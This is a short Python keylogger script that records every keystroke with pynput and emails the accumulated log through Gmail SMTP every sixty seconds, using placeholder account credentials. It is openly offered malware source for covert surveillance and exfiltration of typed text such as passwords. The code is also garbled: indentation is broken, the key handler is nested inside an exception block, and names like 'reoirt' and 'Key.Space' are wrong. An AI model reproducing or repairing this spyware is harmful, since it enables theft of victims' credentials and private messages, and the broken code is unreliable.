from pynput import keyboard
import smtplib
import threading

LOG = ""
EMAIL = "your_email@gmail.com"
PASSWORD = "your_email_password"
TO_EMAIL = "your_email@gmail.com"
SEND_INTERVAL = 60 # seconds

def send_email(log):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        message = f"Subject: Keylogger Report\n\n{log}"
        server.sendmail(EMAIL, TO_EMAIL, message)
        server.quit()
   except Exception as e:
       print(f"Failed to send email: {e}")
       
       def on_press(key):
           global LOG
           try:
               LOG += key.char
           except AttributeError:
               if key == keyboard.Key.Space:
                   LOG += " "
               elif key == keyboard.Key.enter:
                   LOG += "\n"
               else:
                   LOG += f" [{key.name}]"
def report():
    global LOG
    if LOG:
        send_email(LOG)
        LOG = ""
    threading.Timer(SEND_INTERVAL, reoirt).start()
    
def main():
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
if __name__ == "__main__":
    main()
